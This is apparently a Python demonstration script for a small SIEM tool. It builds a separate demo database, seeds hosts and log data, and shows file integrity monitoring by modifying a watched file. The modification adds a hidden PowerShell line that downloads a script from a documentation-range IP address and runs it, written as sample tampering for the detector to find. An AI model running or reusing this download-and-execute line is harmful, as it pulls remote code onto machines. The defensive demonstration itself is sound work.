"""
Run Mini-SIEM against a self-contained demonstration database.

The point of this script is that a demonstration should never be run against
the real instance. The live database holds whatever the lab actually
collected, and a demonstration wants the opposite: a known starting state,
the same every time, that can be thrown away and rebuilt in seconds if
something goes wrong five minutes before a viva.

So everything here is separate. A different database file (instance/demo.db),
a different administrator account, and a watched folder created under
instance/ rather than anywhere that matters. Nothing this script does can
reach instance/mini_siem.db, and running it does not disturb a collection
already in progress.

What it prepares, in order:

    1. An administrator account to log in with.
    2. Two monitored hosts and an imported authentication log, which is enough
       for rules R-01 to R-04 to fire (see scripts/seed_sample_data.py).
    3. A third host representing this machine, with a watched folder, a
       SHA-256 baseline over it, and then a real modification to one of those
       files -- so the File Integrity panel shows a genuine finding rather
       than a fabricated row.

Usage:
    python scripts/run_demo.py                     # build and serve
    python scripts/run_demo.py --password secret1234
    python scripts/run_demo.py --port 5050         # default is 5002
    python scripts/run_demo.py --rebuild           # start from empty again
    python scripts/run_demo.py --prepare-only      # set it up, do not serve

No password is baked into this file. One is generated and printed if you do
not supply one, because a fixed demonstration password in a repository has a
way of becoming a real password somewhere else.
"""
import argparse
import os
import secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from app import create_app
from app.extensions import db
from app.models import Alert, COLLECT_LOCAL, Event, Host, User, WatchedPath
from app.services.detection import DetectionEngine
from app.services.file_integrity import scan_host
from app.services.log_analyzer import LogAnalyzer
from app.services.sample_loader import SampleLoader
from config import Config

# The hosts, the sample log and the banned address all come from the existing
# seeder rather than being defined again here, so the demonstration and the
# documented seeding procedure cannot drift apart.
import seed_sample_data as seeder

DEMO_USERNAME = 'demo'
LOCAL_HOST = {
    'hostname': 'SIEM-Controller',
    'ip_address': '127.0.0.2',
    'os_type': 'WINDOWS',
    'description': 'The machine running Mini-SIEM, watched for file tampering',
}


class DemoConfig(Config):
    """The real configuration, pointed at a throwaway database."""

    SQLALCHEMY_DATABASE_URI = (
        f"sqlite:///{Path(__file__).resolve().parent.parent / 'instance' / 'demo.db'}"
    )
    # The background collector stays on, because "it collects on its own" is
    # one of the things being demonstrated. No host polls until it is switched
    # on individually, so nothing starts hammering the network on startup.


def demo_paths():
    """Where the watched folder and the demo database live."""
    instance = Path(__file__).resolve().parent.parent / 'instance'
    return instance / 'demo.db', instance / 'demo_watched'


def ensure_admin(password):
    """
    Create the demonstration account, or leave an existing one alone.

    Returns the password to display, or None if an existing account was left
    untouched. Restarting the server must not silently change the login:
    somebody halfway through a demonstration, with the credentials written
    down beside them, would find them stop working. A password is written only
    when the account is new or when one was asked for explicitly.

    This only ever touches the account named DEMO_USERNAME in the demo
    database. A real administrator account in instance/mini_siem.db is out of
    reach from here.
    """
    user = User.query.filter_by(username=DEMO_USERNAME).first()

    if user is not None and password is None:
        return None

    if user is None:
        user = User(username=DEMO_USERNAME)
        db.session.add(user)

    user.set_password(password)
    db.session.commit()
    return password


def ensure_local_host():
    """A host representing this machine, so file integrity can be shown."""
    host = Host.query.filter_by(ip_address=LOCAL_HOST['ip_address']).first()
    if host is None:
        host = Host(**LOCAL_HOST)
        db.session.add(host)
    host.collection_method = COLLECT_LOCAL
    host.fim_enabled = True
    db.session.commit()
    return host


def prepare_integrity_demo(host, watch_dir):
    """
    Create a watched folder, baseline it, then tamper with one file.

    The tampering is real: a file on disk is rewritten, and the finding comes
    from comparing a fresh SHA-256 against the stored baseline. Writing an
    Event row directly would have been quicker and would have proved nothing.
    """
    watch_dir.mkdir(parents=True, exist_ok=True)

    (watch_dir / 'hosts.conf').write_text(
        '# Lab host configuration\n127.0.0.1 localhost\n', encoding='utf-8')
    (watch_dir / 'startup.bat').write_text(
        '@echo off\r\nrem Routine lab startup script\r\n', encoding='utf-8')

    watched = WatchedPath.query.filter_by(
        host_id=host.id, path=str(watch_dir)).first()
    if watched is None:
        watched = WatchedPath(
            host_id=host.id,
            path=str(watch_dir),
            recursive=False,
            description='Demonstration folder for file integrity monitoring',
        )
        db.session.add(watched)
        db.session.commit()

    # First scan records the baseline and deliberately reports nothing --
    # every file is new the first time it is seen, and calling that a hundred
    # findings would make the feature useless on the day it was switched on.
    first, _ = scan_host(host)

    # Now something actually changes on disk. This is the line the whole
    # demonstration turns on.
    (watch_dir / 'startup.bat').write_text(
        '@echo off\r\nrem Routine lab startup script\r\n'
        'powershell -w hidden -c "IEX(New-Object Net.WebClient)'
        '.DownloadString(\'http://198.51.100.23/p.ps1\')"\r\n',
        encoding='utf-8')
    (watch_dir / 'notes.txt').write_text('added after the baseline\n', encoding='utf-8')

    second, _ = scan_host(host)
    return first, second


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--password', help='demo account password (generated if omitted)')
    # 5002, not 5001: the real instance uses 5001, and a demonstration that
    # cannot be run alongside the live system is a demonstration you have to
    # shut the live system down for.
    parser.add_argument('--port', type=int, default=5002, help='port to serve on')
    parser.add_argument('--rebuild', action='store_true',
                        help='delete the demo database first and build it again')
    parser.add_argument('--prepare-only', action='store_true',
                        help='build the demo data but do not start the server')
    args = parser.parse_args()

    db_path, watch_dir = demo_paths()

    if args.rebuild:
        if db_path.exists():
            db_path.unlink()
            print(f'Removed {db_path}')
        # The watched folder is cleared too. A file left behind by an earlier
        # run would be baselined as though it had always been there, and the
        # "a new file appeared" half of the demonstration would never happen.
        if watch_dir.exists():
            for leftover in watch_dir.iterdir():
                if leftover.is_file():
                    leftover.unlink()
            print(f'Cleared {watch_dir}')

    requested = args.password or os.getenv('MINISIEM_DEMO_PASSWORD')
    fresh_database = not db_path.exists()

    app = create_app(DemoConfig)

    with app.app_context():
        # A database being created now needs a password whether or not one was
        # supplied; an existing one keeps whatever it already had.
        password = ensure_admin(
            requested or (secrets.token_urlsafe(9) if fresh_database else None)
        )

        print('Preparing hosts and threat intelligence...')
        hosts = seeder.ensure_hosts()
        seeder.ensure_threat_ip(ban=True)

        print('Importing the bundled authentication log...')
        content = seeder.load_sample(app)
        events, detected = SampleLoader.parse(content, filename=seeder.SAMPLE_FILE)
        for host in hosts:
            LogAnalyzer.ingest(events, host.id, origin='IMPORTED')

        # Ingest applies the rules per host; this pass picks up the cross-host
        # correlation R-04 depends on, now that both hosts have their events.
        DetectionEngine.run()

        print('Preparing the file integrity demonstration...')
    # Note: on a database that already has a baseline, resetting these files
    # is itself a change, and the scan will correctly say so. --rebuild is
    # what gives the clean "baseline, then one tampered file" story.
        local = ensure_local_host()
        baseline, changed = prepare_integrity_demo(local, watch_dir)

        print('\nDemonstration instance ready.')
        print(f'  database    {db_path}')
        print(f'  watched     {watch_dir}')
        print(f'  hosts       '
              + ', '.join([h.hostname for h in hosts] + [local.hostname]))
        print(f'  events      {Event.query.count()}')
        print(f'  alerts      {Alert.query.count()}')
        print(f'  baseline    {baseline["message"]}')
        print(f'  integrity   {changed["message"]}')
        if password:
            print(f'\n  Log in as   {DEMO_USERNAME} / {password}')
        else:
            print(f'\n  Log in as   {DEMO_USERNAME}, with the password set when '
                  'this demo database was created.')
            print('  Pass --password to set a new one.')

    if args.prepare_only:
        return 0

    print(f'\nServing on http://127.0.0.1:{args.port}/ -- Ctrl+C to stop.\n')
    app.run(host='127.0.0.1', port=args.port, debug=False, use_reloader=False)
    return 0


if __name__ == '__main__':
    sys.exit(main())
